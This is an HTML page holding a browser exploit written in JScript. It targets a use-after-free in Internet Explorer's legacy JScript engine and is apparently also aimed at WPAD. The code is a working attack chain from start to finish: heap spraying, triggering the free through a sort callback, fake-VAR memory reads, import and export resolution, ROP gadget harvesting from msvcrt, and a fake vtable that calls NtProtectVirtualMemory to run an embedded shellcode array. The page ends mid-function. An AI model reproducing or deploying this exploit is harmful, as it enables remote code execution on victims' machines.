<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="x-ua-compatible" content="IE=EmulateIE8" />
        <script language="JScript.Compact">
		
		var Shellcode = [ 0x0004a164, 0x002d0000, 0x94000010, 0x68e58960, 0x00038f88, 0x00003ce8, 0xb81a6800, 0xe8500006, 0x0000007d, 0x7068646a, 0x89656e77, 0x656e68e1, 0x6f680074, 0x682e7272, 0x2d747365, 0x726f6668, 0x77776872, 0xe2892e77, 0x5152006a, 0xd0ff006a, 0x9461ec89, 0xe58955c3, 0x30be5657, 0x64000000, 0x0c408bad, 0x8918788b, 0xebc031fe, 0x74f73904, 0x74f68528, 0x245e8d24, 0x1474db85, 0x85044b8b, 0x6a0d74c9, 0x5de85101, 0x3b000001, 0x06740845, 0x368bc031, 0x468bd7eb, 0x895f5e10, 0x04c25dec, 0xe5895500, 0x0230ec81, 0x458b0000, 0xf8458908, 0x03f8558b, 0xc0833c42, 0xf0458904, 0x8914c083, 0xc289f445, 0x0308458b, 0x4a8b6042, 0xd04d8964, 0x89fc4589, 0x08458bc2, 0x89204203, 0x558bec45, 0x08458bfc, 0x89244203, 0x558be445, 0x08458bfc, 0x891c4203, 0xc031e845, 0x89e04589, 0x458bd845, 0x18408bfc, 0x0fe0453b, 0x0000d286, 0xe0458b00, 0x00850c8d, 0x8b000000, 0x458bec55, 0x11040308, 0x6ad44589, 0xbde85000, 0x3b000000, 0x850f0c45, 0x000000a1, 0x8de0458b, 0x458b0014, 0x04b70fe4, 0x850c8d02, 0x00000000, 0x8be8558b, 0x04030845, 0xd8458911, 0x89fc4d8b, 0xd05503ca, 0x7f7cc839, 0x7b7dd039, 0x00d845c7, 0x31000000, 0xd09d8dc9, 0x8afffffd, 0xfa800814, 0x80207400, 0x15752efa, 0x642e03c7, 0xc3836c6c, 0x0003c604, 0xfed09d8d, 0xeb41ffff, 0x411388de, 0xc6d8eb43, 0x9d8d0003, 0xfffffdd0, 0xe853006a, 0x0000003c, 0xfea3e850, 0xc085ffff, 0x45892974, 0x8d006adc, 0xfffed095, 0x21e852ff, 0x50000000, 0xe8dc75ff, 0xfffffed1, 0xebd84589, 0xe0458d0a, 0x1fe900ff, 0x8bffffff, 0xec89d845, 0x0008c25d, 0x57e58955, 0x8b084d8b, 0xdb310c7d, 0x74003980, 0x01b60f14, 0xb60f600c, 0xd1d301d0, 0xff8541e3, 0xeb41ea74, 0x5fd889e7, 0xc25dec89, 0x00650008, ];
		var spray_size = 20000;  //200 GcBlocks
		var overlay_size = 20000; 
		var total;
		var dept;
		var spray;
		var reclaimUsingIndex;
		var mutableVARinname;

		var overlaybackup;
		var overlay;
		var variants; 
		var overlaybackupIndex = -1; //leaked target VAR index in overlaybackup (i,e this index holds the leaked VVAL)
		var staticPropertyNameforRECLAIM = Array(379).join('A');
		
		var tosort = new Array();
		for(i = 0; i < 310; i++) tosort[i] = [0, 0];
		var LFHBlocks = new Array();



		
		function CreateVar32(Type, ObjPtr, NextVar) {
			var Data = new Array(); // Every element of this array will be a WORD
			Data.push(Type, 0x00, 0x00, 0x00, ObjPtr & 0xFFFF, (ObjPtr >> 16) & 0xFFFF, NextVar & 0xFFFF, (NextVar >> 16) & 0xFFFF);
			return String.fromCharCode.apply(null, Data);
		}//returns 16 bytes(size of VAR)
		
		
		function ReadByte(Address) {
			reclaimUsingIndex(0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
			return (mutableVARinname.length >> 15) & 0xff; // Shift to align and get the byte.
		}

		function ReadWord(Address) {
			reclaimUsingIndex(0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
			return ((mutableVARinname.length >> 15) & 0xff) + (((mutableVARinname.length >> 23) & 0xff) << 8);
		}

		function ReadDword(Address) {
			reclaimUsingIndex(0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
			var LowWord = ((mutableVARinname.length >> 15) & 0xff) + (((mutableVARinname.length >> 23) & 0xff) << 8);
			reclaimUsingIndex(0, CreateVar32(0x8, Address + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
			var HighWord = ((mutableVARinname.length >> 15) & 0xff) + (((mutableVARinname.length >> 23) & 0xff) << 8);
			return LowWord + (HighWord << 16);
		}
		
		function LeakObjectAddress(VVALasVAR, targetObj) { // This function does not always work, there are some edge cases. For example if a BSTR is declared var A = "123"; it works fine. However, var A = "1"; A += "23"; resuls in multiple layers of VARs referencing VARs and this function will no longer get the actual BSTR address.
			reclaimUsingIndex(targetObj, CreateVar32(0x8, (VVALasVAR + 8) + 2, 0)); // Skip +8 over Type field of VAR to object pointer field and +2 for BSTR length adjustment
			var LowWord = ((mutableVARinname.length >> 15) & 0xff) + (((mutableVARinname.length >> 23) & 0xff) << 8);
			reclaimUsingIndex(targetObj, CreateVar32(0x8, VVALasVAR + 8 + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field) and +8 to skip over VAR Type
			var HighWord = ((mutableVARinname.length >> 15) & 0xff) + (((mutableVARinname.length >> 23) & 0xff) << 8);
			return ReadDword((LowWord + (HighWord << 16)) + 8); // The VAR at the start of the VVAL has an object pointer that points to yet another VAR: this second one will have the actual address of the object in its object pointer field
		}
		
		
		function FindModuleBase(Address) {
			var Base = (Address & 0xFFFF0000) + 0x4e; // Offset of "This program cannot be run in DOS mode" in PE header.

			while(true) {
				if(ReadWord(Base) == 0x6854) { // 'hT'
					if(ReadWord(Base + 2) == 0x7369) { // 'si'
						return (Base - 0x4E);
					}
				}
				Base -= 0x10000;
			}
			return 0;
		}
		
		

		
		
		
		
		function setup(){ //reset globals and spray but not freed yet
			dept = 0; 
			total = new Array();//total = array of Untracked vars pointers
			overlay = new Array();
			spray = new Array();

			for(var i = 0; i < overlay_size; i++) overlay[i] = new Object();  //overlay before spray coz we dont want any unnecessary alloc between the spray, free and realloc process, AND also we are overlaying with VVAL(property name(s) of any object) and not GcBlocks
			for(var i = 0; i < spray_size; i++) spray[i] = new Object();
			CollectGarbage();
			tosort[0].sort(exploit_uaf);
		}// end of setup
		
		
		
		
		function exploit_uaf(untrack1, untrack2){	//after setup() this will free the setup allocations and collect untracked pointers to total array
			untrack1 = spray[dept*2];
			untrack2 = spray[dept*2 + 1];
			if(dept > 150){
				spray = new Array(); //free the spray
				CollectGarbage(); //deallocate(free) to heap	
				total.push(untrack1);
				total.push(untrack2);
				return 0;
			}
				
				dept += 1;
				tosort[dept].sort(exploit_uaf);
				total.push(untrack1);
				total.push(untrack2);
				return 0;
		} //exploit() ending
		
		var InitialReClaim = true;
		
		
		
		function ORIreclaimUsingIndex(value, fakeVARasPropertyName){ 
		    var PrecisionReClaimAllocCount = 1000; // This is the number of re-claim attempts that are needed for a precision re-claim of a single freed region, not hundreds such as in the case of the GcBlock/type confusion re-claims. On IE8/11 300 is plenty, on WPAD 500 seems to be more stable. 
			CollectGarbage(); // Cleanup
    
			if(InitialReClaim) {
				overlaybackup[overlaybackupIndex] = null;
				InitialReClaim = false;
				PrecisionReClaimAllocCount -= 1;
				overlaybackup[overlaybackupIndex] = new Object(); // Clog the index
			}
    
			for(var i = 0; i < PrecisionReClaimAllocCount; i++) {
				if(i != overlaybackupIndex) overlaybackup[i] = null;
			}
    
			CollectGarbage(); // Free the leaked NameList
    
			for(var i = 0; i < PrecisionReClaimAllocCount; i++) {
				if(i != overlaybackupIndex) overlaybackup[i] = new Object();
				overlaybackup[i][staticPropertyNameforRECLAIM] = 1; // 0x239 property name size for 0x970 NameList allocation size
				overlaybackup[i]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
				overlaybackup[i]["\u0003"] = 1;
				overlaybackup[i][fakeVARasPropertyName] = value; // The mutable variable
			}	
			
			//alert("done original reclaimUsingIndex");
		} //ending reclaimUsingIndex		
		
		
		
		function MICreclaimUsingIndex(value, fakeVARasPropertyName){ 
		    var PrecisionReClaimAllocCount = 1000; // This is the number of re-claim attempts that are needed for a precision re-claim of a single freed region, not hundreds such as in the case of the GcBlock/type confusion re-claims. On IE8/11 300 is plenty, on WPAD 500 seems to be more stable. 
			CollectGarbage(); // Cleanup
    
			if(InitialReClaim) {
				overlaybackup[overlaybackupIndex] = null;
				InitialReClaim = false;
				PrecisionReClaimAllocCount -= 1;
			}
    
			for(var i = 0; i < PrecisionReClaimAllocCount; i++) {
				overlaybackup[i] = null;
			}
    
			CollectGarbage(); // Free the leaked NameList
    
			for(var i = 0; i < PrecisionReClaimAllocCount; i++) {
				overlaybackup[i] = new Object();
				overlaybackup[i][staticPropertyNameforRECLAIM] = 1; // 0x239 property name size for 0x970 NameList allocation size
				overlaybackup[i]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
				overlaybackup[i]["\u0003"] = 1;
				overlaybackup[i][fakeVARasPropertyName] = value; // The mutable variable
			}	
			
			//alert("done mic reclaimUsingIndex");
		} //ending reclaimUsingIndex
		
		
		
		
		function NullSanitizeWord(StrWord) {
			var Sanitized = 0;

			if(StrWord != 0) {
				if((StrWord & 0x00FF) == 0) {
					Sanitized = 0; // First byte is NULL, end of the string.
				}
				else {
					Sanitized = StrWord;
				}
			}
			return Sanitized;
		}
		
		
		
		function StrcmpLeak(StrDwordTable, LeakAddress) { // Compare two strings between an array of WORDs and a string at a memory address
			var TargetTableIndex = 0;

			while (TargetTableIndex < StrDwordTable.length) {
				var LeakStrWord = ReadWord(LeakAddress + (4 * TargetTableIndex));
				var SanitizedStrWord = NullSanitizeWord(LeakStrWord);
				var TableWord = (StrDwordTable[TargetTableIndex] & 0x0000FFFF);

				//alert("StrcmpLeak comparing 0x");
				//alert(TableWord.toString(16));
				//alert(" to 0x");
				//alert(SanitizedStrWord.toString(16));
				//alert(" original word ");
				//alert(LeakStrWord.toString(16));
				

				if(TableWord == SanitizedStrWord) {
					LeakStrWord = ReadWord((LeakAddress + (4 * TargetTableIndex) + 2));
					SanitizedStrWord = NullSanitizeWord(LeakStrWord);
					TableWord = ((StrDwordTable[TargetTableIndex] & 0xFFFF0000) >> 16);
					//alert("StrcmpLeak comparing 0x");
					//alert(TableWord.toString(16));
					//alert(" to 0x");
					//alert(SanitizedStrWord.toString(16));
					//alert(" original word ");

					if(TableWord == SanitizedStrWord) {
						if((TargetTableIndex + 1) >= StrDwordTable.length) {
							return true;
						}
						else {
						//	alert("Chunks are equal but not at final index,");
						}

						TargetTableIndex++;
					}
					else {
						break;
					}
				}
				else {
					break;
				}
			}

			return false;
		}
		
		
		
		
		
		function ExtractBaseFromImports(ModuleBase, TargetModuleNameTable) { // Grab the first IAT entry of a function within the specified module
			var ExtractedAddresss = 0;
			var FileHdr = ReadDword(ModuleBase + 0x3c);
			var ImportDataDir = ModuleBase + FileHdr + 0x80; // Import data directory
			var ImportRva = ReadDword(ImportDataDir);
			var ImportSize = ReadDword(ImportDataDir + 0x4); // Get the size field of the import data dir
			var CurrentNameDesc = ModuleBase + ImportRva;

			while(ImportSize != 0) {
				NameField = ReadDword(CurrentNameDesc + 0xc); // 0xc is the offset to the module name pointer

				if(NameField != 0) {
					if(StrcmpLeak(TargetModuleNameTable, ModuleBase + NameField)) {
						ThunkAddress = ReadDword(CurrentNameDesc + 0x10);
						ExtractedAddresss = ReadDword(ModuleBase + ThunkAddress + 8); // +8 since __imp___C_specific_handler can cause issues when imported in some jscript instances
						break;
					}

					ImportSize -= 0x14;
					CurrentNameDesc += 0x14; // Next import descriptor in array
				}
				else {
					break;
				}
			}

			return ExtractedAddresss;
		}
		
		
		
		
		
		
		
		function CheckINTThunk(ModuleBase, INTThunkRva, TargetImportNameTable) {
			var INTThunkValue = ReadDword(ModuleBase + INTThunkRva);
		//	alert("in check after read");
			if(INTThunkValue == 0) {
				return -1;
			}

			if((INTThunkValue & 0x80000000) == 0) { // Only parse non-orginal INT entries
				var ImportNameAddress = (ModuleBase + INTThunkValue + 2); // The INT thunk is an RVA pointing at a IMAGE_IMPORT_BY_NAME struct. Skip the hint field in this struct to point directly to the ASCII import name.
				//alert("bout ta cmd");
				if(StrcmpLeak(TargetImportNameTable, ImportNameAddress)) {
					return 1;
				}
			}

			return 0;
		}

		
		
		
		
		
		
		function ResolveImport(ModuleBase, HintIndex, TargetModuleNameTable, TargetImportNameTable) {
			var ExtractedAddresss = 0;
			var FileHdr = ReadDword(ModuleBase + 0x3c);
			var ImportDataDir = ModuleBase + FileHdr + 0x80; // Import data directory
			var ImportRva = ReadDword(ImportDataDir);
			var ImportSize = ReadDword(ImportDataDir + 0x4); // Get the size field of the import data dir
			var CurrentNameDesc = ModuleBase + ImportRva;

			while(ImportSize != 0) {
				NameField = ReadDword(CurrentNameDesc + 0xc); // 0xc is the offset to the module name pointer

				if(NameField != 0) {
					if(StrcmpLeak(TargetModuleNameTable, ModuleBase + NameField)) {
						alert("Found the target module by name. Walk its INT to check each name.");

						var HighIATIndex = (HintIndex + 1);
						var LowIATIndex = (HintIndex - 1);
						var BaseINTThunkRva = (ReadDword(CurrentNameDesc + 0x0));
						var BaseIATThunkRva = (ReadDword(CurrentNameDesc + 0x10));
						var ResolvedIATIndex = -1;

						if(BaseINTThunkRva == 0) {
							alert("INT is empty in target module");
						}

						// Start by checking the INT at the specified hint index

						if(CheckINTThunk(ModuleBase, BaseINTThunkRva + (HintIndex * 4), TargetImportNameTable)) {
							ExtractedAddresss = ReadDword(ModuleBase + BaseIATThunkRva);
							alert("found at hint");
							break;
						}
						alert("not found at hint");
						// Specified import was not found at the provided hint index. Walk the INT forward/backward in unison from the hint index.

						var HighINTThunkRva = (BaseINTThunkRva + (HighIATIndex * 4));
						var LowINTThunkRva = (BaseINTThunkRva + (LowIATIndex * 4));
						var HitINTThunkCeiling = 0;

						while(true) {
							if(!HitINTThunkCeiling) {
								//alert("chck intthunk");
								var ThunkRes = CheckINTThunk(ModuleBase, HighINTThunkRva, TargetImportNameTable);
								//alert("done chck");
								if(ThunkRes == -1) {
									//alert("trunk hit");
									HitINTThunkCeiling = 1;
								}
								else if(ThunkRes) {
								//	alert("if trunk yes");
									ExtractedAddresss = ReadDword(ModuleBase + BaseIATThunkRva + (HighIATIndex * 4));
									ResolvedIATIndex = HighIATIndex;
								//	alert("done if trunk yes");
									break;
								}
								else {
									HighINTThunkRva += 4;
									HighIATIndex++;
								}
							}
						//	alert("thunkceiling out");

							if(LowINTThunkRva >= BaseINTThunkRva) {
								if(CheckINTThunk(ModuleBase, LowINTThunkRva, TargetImportNameTable)) {
									ExtractedAddresss = ReadDword(ModuleBase + BaseIATThunkRva + (LowIATIndex * 4));
									ResolvedIATIndex = LowIATIndex;
									break;
								}

								LowINTThunkRva -= 4;
								LowIATIndex--;
							}
						}
						alert("out whille");

						if(ExtractedAddresss != 0) {
							alert("Identified target import at IAT index ");
							alert(ResolvedIATIndex.toString(10));
							break;
						}
					}

					ImportSize -= 0x14;
					CurrentNameDesc += 0x14; // Next import descriptor in array
				}
				else {
					break;
				}
			}

			return ExtractedAddresss;
		}

		
		function DwordToUnicode(Dword) {
			var Unicode = String.fromCharCode(Dword & 0xFFFF);
			Unicode += String.fromCharCode(Dword >> 16);
			return Unicode;
		}
		
		function TableToUnicode(Table) {
			var Unicode = "";

			for (i = 0; i < Table.length; i++) {
				Unicode += DwordToUnicode(Table[i]);
			}

			return Unicode;
		}
		
		
		
		
		
		function BinaryCmp(TargetNum, CmpNum) { // return -1 for TargetNum being greater, 0 for equal, 1 for CmpNum being greater
			if(TargetNum == CmpNum) {
				return 0;
			}

			while(true) {
				if((TargetNum & 0xff) > (CmpNum & 0xff)) {
					return -1;
				}
				else if((TargetNum & 0xff) < (CmpNum & 0xff)) {
					return 1;
				}

				TargetNum = TargetNum >> 8;
				CmpNum = CmpNum >> 8;
			}
		}




		
		
		
		
		
		
		
		
		function ResolveExport(ModuleBase, TargetExportNameTable) {
			var FileHdr = ReadDword(ModuleBase + 0x3c);
			var ExportDataDir = ModuleBase + FileHdr + 0x78;

			if(ExportDataDir) {
				var EATRva = ReadDword(ExportDataDir);
				var TotalExports = ReadDword(ModuleBase + EATRva + 0x14);
				var AddressRvas = ReadDword(ModuleBase + EATRva + 0x1C);
				var NameRvas = ReadDword(ModuleBase + EATRva + 0x20);
				var OrdinalRvas = ReadDword(ModuleBase + EATRva + 0x24);
				var MaxIndex = TotalExports;
				var MinIndex = 0;
				var CurrentIndex = Math.floor(TotalExports / 2);
				var TargetTableIndex = 0;
				var BinRes = 0;

				while(TotalExports) {
					var CurrentNameRva = ReadDword(ModuleBase + NameRvas + 4*CurrentIndex);

					while (TargetTableIndex < TargetExportNameTable.length) {
						CurrentNameWord = ReadWord(ModuleBase + (CurrentNameRva + (4 * TargetTableIndex)));
						var ExportNameWord = (TargetExportNameTable[TargetTableIndex] & 0x0000FFFF);
						var SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
						BinRes = BinaryCmp(ExportNameWord, SanitizedCurrentNameWord);
					//	alert("Compaaring 0x");
					//	alert(ExportNameWord.toString(16));
					//	alert(" to sanitized 0x");
					//	alert(SanitizedCurrentNameWord.toString(16));
					//	alert(" result: ");
					//	alert(BinRes.toString(10));

						if(!BinRes) {
							//alert("Matched!");
							ExportNameWord = ((TargetExportNameTable[TargetTableIndex] & 0xFFFF0000) >> 16);

							if(ExportNameWord != 0) { // Special case: final WORD of name array is 0, consider this a match
								CurrentNameWord = ReadWord(ModuleBase + (CurrentNameRva + (4 * TargetTableIndex)) + 2);
								SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
								BinRes = BinaryCmp(ExportNameWord, SanitizedCurrentNameWord);
								//DebugLog("Compaaring 0x" + ExportNameWord.toString(16) + " to sanitized 0x" + SanitizedCurrentNameWord.toString(16) + " result: " + BinRes.toString(10) + " at index " + TargetTableIndex.toString(10));
							//	alert("specialcase");
								if(!BinRes) {
									//alert("Matched!");

									if((TargetTableIndex + 1) >= TargetExportNameTable.length) {
										Ordinal = ReadWord(ModuleBase + OrdinalRvas + 2*CurrentIndex);
										MainExport = (ModuleBase + ReadDword(ModuleBase + AddressRvas + 4*Ordinal));
										return [ MainExport , CurrentIndex];
									}
									else {
										//alert("Chunks are equal but not at final index, current is: ");
										//alert(TargetTableIndex.toString(10));
									}

									TargetTableIndex++;
								}
								else {
									TargetTableIndex = 0;
									break;
								}
							}
							else {
								if((TargetTableIndex + 1) >= TargetExportNameTable.length) {
									Ordinal = ReadWord(ModuleBase + OrdinalRvas + (2 * CurrentIndex));
									MainExport = (ModuleBase + ReadDword(ModuleBase + AddressRvas + (4 * Ordinal)));
									return [ MainExport, CurrentIndex];
								}
								else {
									alert("Fatal error during export lookup: target export name array contained a NULL byte not at the end of its final element");
								}
							}
						}
						else {
							TargetTableIndex = 0;
							break;
						}
					}

					if(BinRes == 1) { // Target is greater than what it was compared to: reduce current index
						if(MaxIndex == CurrentIndex) {
							alert("Failed to find export: index hit max");
							break;
						}

						MaxIndex = CurrentIndex;
						CurrentIndex = Math.floor((CurrentIndex + MinIndex) / 2);
					}
					else if (BinRes == -1) { // Target is less than what it was compared to: enhance current index
						if(MinIndex == CurrentIndex) {
							alert("Failed to find export: index hit min");
							break;
						}

						MinIndex = CurrentIndex;
						CurrentIndex = Math.floor((CurrentIndex + MaxIndex) / 2);
					}

					if(CurrentIndex == MaxIndex && CurrentIndex == MinIndex) {
						alert("Failed to find export: current, min and max indexes are all equal");
						break;
					}
				}
			}

			return [0,0];
		}
		
		
		
		
		
		
		
		
		
		
		
		
		function HarvestGadget(HintExportAddress, MaxDelta, Data, DataMask, MagicOffset) {
			var MaxHighOffset = (HintExportAddress + MagicOffset + MaxDelta);
			var MinLowOffset = ((HintExportAddress + MagicOffset) - MaxDelta);
			var LeakAddress = HintExportAddress + MagicOffset;
			var LeakFunc = ReadDword; // In nthe event a 0x00FFFFFF mask is used, LeakDword will be used, but will still be filtered

			if(MinLowOffset < HintExportAddress) {
				MinLowOffset = HintExportAddress;
			}

			//alert("Hunting for gadget 0x" );
			//alert(Data.toString(16));
			//alert(" betwee 0x");
			//alert(MinLowOffset.toString(16));
			//alert(" and 0x" );
			//alert(MaxHighOffset.toString(16));
			//alert(" starting from 0x" );
			//alert(LeakAddress.toString(16));

			if(DataMask == 0x0000FFFF) {
				LeakFunc = ReadWord;
			}
			else {
				alert("Unhaandled data mask for gadget harvest");
				return 0;
			}

			if((LeakFunc(LeakAddress) & DataMask) == Data) {
				//alert("Found gadget at expected delta of ");
				alert(MagicOffset.toString(16));
			}
			else {
				var HighAddress = (LeakAddress + 1);
				var LowAddress = LeakAddress - 1;

				LeakAddress = 0;

				while(LowAddress >= MinLowOffset || HighAddress < MaxHighOffset) {
					if(LowAddress >= MinLowOffset) {
						if((LeakFunc(LowAddress) & DataMask) == Data) {
							alert("Found gadget from scan below magic at ");
							alert(LowAddress.toString(16));
							LeakAddress = LowAddress;
							break;
						}

						LowAddress -= 1;
					}
	
					if(HighAddress < MaxHighOffset) {
						if((LeakFunc(HighAddress) & DataMask) == Data) {
							alert("Found gadget from scan above magic at ");
							alert(HighAddress.toString(16));
							LeakAddress = HighAddress;
							break;
						}

						HighAddress += 1;
					}
				}
			}

			return LeakAddress;
		}
		
		
		
		
		
		
		
		
		
		
		
		
		function ResolveGadgetSet(MsvcrtBase) { // Dynamically resolve gadget addresses via delta from export addresses - MSVCRT.DLL is used to harvest gadgets as its EAT is not protected by EAF/EAF+
			var GadgetSetObj = new Object();

			alert("Dynamically resolving ROP gadget addresses from MSVCRT.DLL export address hints from base ");
			alert(MsvcrtBase.toString(16));

			// XCHG EAX, ESP; RET

			var ExportPair = ResolveExport(MsvcrtBase, [0x7974635f]); // 'ytc_'

			if(ExportPair[0]) {
				GadgetSetObj.StackPivot = HarvestGadget(ExportPair[0], 0x9C37, 0xc394, 0x0000FFFF, 0x8A37);

				if(GadgetSetObj.StackPivot != 0) {
					alert("Stack pivot resolved to: ");
					alert(GadgetSetObj.StackPivot.toString(16));
					GadgetSetObj.RopNop = (GadgetSetObj.StackPivot + 1);

					// POP EAX; RET
					// Win7/8 (+0x13 and same export on both)
					// _safe_fdivr:0x00031821 (+0x13) <- 0x00031834 -> (+0x208) _adj_fprem:0x00031a3c

					ExportPair = ResolveExport(MsvcrtBase, [0x6661735f, 0x64665f65, 0x00727669]); // 'fas_' 'df_e' 'rvi'

					if(ExportPair[0]) {
						GadgetSetObj.PopEax = HarvestGadget(ExportPair[0], 0x100, 0xc358, 0x0000FFFF, 0x00000013); // Win7/8.1 have same offset

						if(GadgetSetObj.PopEax) {
							alert("found pop eax too");
							return GadgetSetObj;
						}
						else {
							alert("Failed to resolve POP EAX gadget address");
						}
					}
					else {
						alert("Failed to resolve msvcrt.dll!_safe_fdivr as export hint");
					}
				}
				else {
					alert("Failed to resolve stack pivot gadget address");
				}
			}
			else {
				alert("Failed to resolve msvcrt.dll!__libm_sse2_log10 as export hint");
			}

			return null;
		}
		
		
	
		
		function ConvertDwordArrayToBytes(DwordArray) {
			var ByteArray = [];

			for (i = 0; i < DwordArray.length; i++) {
				ByteArray.push(DwordArray[i] & 0xffff);
				ByteArray.push((DwordArray[i] & 0xffff0000) >> 16);
			}

			return String.fromCharCode.apply(null, ByteArray);
		}
		
		
		
		
		
		function ResolveNtProtectProxyStub(ScanAddress, MaxOffset) {
    /*
    Windows 7 x64 NTDLL Wow64

    7725001A | 64:FF15 C0000000         | call dword ptr fs:[C0]                  |
    77250021 | 83C4 04                  | add esp,4                               |
    77250024 | C2 0800                  | ret 8                                   |
    77250027 | 90                       | nop                                     |
    77250028 | E9 BB0857BF              | jmp 367C08E8                            | <- NtProtectVirtualMemory
    7725002D | CC                       | int3                                    |
    7725002E | CC                       | int3                                    |
    7725002F | 8D5424 04                | lea edx,dword ptr ss:[esp+4]            |
    77250033 | 64:FF15 C0000000         | call dword ptr fs:[C0]                  |
    7725003A | 83C4 04                  | add esp,4                               |
    7725003D | C2 1400                  | ret 14                                  |
    77250040 | B8 4E000000              | mov eax,4E                              | 4E:'N'
    77250045 | 33C9                     | xor ecx,ecx                             |
    77250047 | 8D5424 04                | lea edx,dword ptr ss:[esp+4]            |
    7725004B | 64:FF15 C0000000         | call dword ptr fs:[C0]                  |
    77250052 | 83C4 04                  | add esp,4                               |
    77250055 | C2 1400                  | ret 14                                  |

    Windows 7 x86 NTDLL 32-bit

    77305F18 | B8 D7000000              | mov eax,D7                              | <- NtProtectVirtualMemory
    77305F1D | BA 0003FE7F              | mov edx,<&KiFastSystemCall>             | <- stub resolved here
    77305F22 | FF12                     | call dword ptr ds:[edx]                 |
    77305F24 | C2 1400                  | ret 14                                  |
    */

    var Offset = 0;
    var LastMovEaxAddress = 0;
    var ProxyStubAddress = 0;
    var RetnScenarioOne = 0;
    var RetnScenarioTwo = 0;

    // Scan forward searching for 0xB8 opcode. Once one is found, scan forward until 0xC2 0x14 0x00 is found. Proxy stub address will be the address of the last 0xB8 opcode +5.

    while(Offset < MaxOffset) {
        var LeakAddress = ScanAddress + Offset;
        var LeakedWord = ReadWord(LeakAddress);
        var ByteOne = (LeakedWord & 0x00FF);
        var ByteTwo = ((LeakedWord & 0xFF00) >> 8);

        if(ByteOne == 0xB8) {
            LastMovEaxAddress = LeakAddress;
        }
        else if(ByteTwo == 0xB8) {
            LastMovEaxAddress = (LeakAddress + 1);
        }

        /*
        Scenario one:

            Byte one = 0xc2
            Byte two = 0x14

        Next:

            Byte one = 0x00

        --

        Scenario two:

            Byte two - 0xC2

        Next:

            Byte one - 0x14
            Byte two - 0x00
        */

        else if(LastMovEaxAddress != 0) {
            if(!RetnScenarioOne) {
                if(ByteOne == 0xc2 && ByteTwo == 0x14) {
                    RetnScenarioOne = 1;
                }
            }
            else {
                if(ByteOne == 0x00) {
                    ProxyStubAddress = (LastMovEaxAddress + 5);
                    alert("NtProtectVirtualMemory proxy stub scenario one scan success: 0x");
					alert(ProxyStubAddress.toString(16));
                    break;
                }
                else {
                    RetnScenarioOne = 0;
                }
            }

            if(!RetnScenarioTwo) {
                if(ByteTwo == 0xC2) {
                    RetnScenarioTwo = 1;
                }
            }
            else {
                if(ByteOne == 0x14 && ByteTwo == 0x00) {
                    ProxyStubAddress = (LastMovEaxAddress + 5);
                    alert("NtProtectVirtualMemory proxy stub scenario two scan success: 0x");
					alert(ProxyStubAddress.toString(16));
                    break;
                }
                else {
                    RetnScenarioTwo = 0;
                }
            }
        }

        Offset += 2;
    }

    return ProxyStubAddress;
}
		
		
		
		
		
		
		
		
		function CreateFakeVtable(FakeVtablePaddingSize, VtableSize, NtProtectAddress, ShellcodeAddress, RopGadgetSet, WritableAddress) {
		// [Padding]
		// [ROPNOP sled]
		// [Stack alignment gadget]
		// [Stack pivot]
		// [Set EAX to 0x4D]
		// [NtProtoectVirtualMemry]
		// [Shellcode address] <- NtProtoectVirtualMemry return
		// [NtProtoectVirtualMemry parameters]
		// [Stack pivot]
		// [Padding]
			
			var FakeVtable = "";
			var X = 0;
			var Y = 0;
			var PaddingArrayLen = FakeVtablePaddingSize / 4;
			var TotalObjLen = ((FakeVtablePaddingSize + VtableSize) / 2);
			var PaddingArray = [];
			var SyscallNumber;

			for(i = 0; i < PaddingArrayLen; i++) {
				PaddingArray[i] = 0x11111111;
			}

			FakeVtable += ConvertDwordArrayToBytes(PaddingArray);

			alert("Final stack pivot for vtable at ");
			alert(RopGadgetSet.StackPivot.toString(16));

			while (FakeVtable.length < TotalObjLen) {
				if(Y == 0x9c) {
					FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.StackPivot]);
				}
				else if(Y == 0x98) {
					FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.PopEax]);
				}
				else {
					FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.RopNop]);
				}

				Y += 4;
			}

		// Layout of storage address region
		// +0x0 | Original ESP
		// +0x4 | Shellcode address
		// +0x8 | Shellcode size
		// +0xC | Old protection

			FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.PopEax]);

			
			SyscallNumber = 0x4F; // Windows 10 x64 NtProtectVirtualMemory SYSCALL #
			alert("FakeVtable += fake stack");

		// NTSTATUS NtProtectVirtualMemory(IN HANDLE ProcessHandle, IN OUT PVOID *BaseAddress, IN OUT PULONG RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect);

			FakeVtable += ConvertDwordArrayToBytes([SyscallNumber]);
			FakeVtable += ConvertDwordArrayToBytes([NtProtectAddress]);
			FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.RopNop]); // Return address
			FakeVtable += ConvertDwordArrayToBytes([0xFFFFFFFF]);
			FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0x4]);
			FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0x8]);
			FakeVtable += ConvertDwordArrayToBytes([0x40]); // +RX (PAGE_EXECUTE_READ) causes problems due to the page alignment used by NtProtectVirtualMemory. The shellcode is unlikely to begin on a clean multiple of 0x1000, and similarly won't probably end on one either (although this attribute can be manipulated with padding). +RW data on the heap surrounding the shellcode may end up +RX and this causes crashes.
			FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0xC]);
			FakeVtable += ConvertDwordArrayToBytes([ShellcodeAddress]);
			FakeVtable += ConvertDwordArrayToBytes([0x11111111]); // Shellcode will return to this pseudo-address

			// Padding on the end of the vtable is not needed: both NtProtectVirtualMemory and the shellcode will be using memory below this address
			alert("ret fakeVtblelong");
			return FakeVtable;
			
		}




		
		
		
		function leakVVAL(){
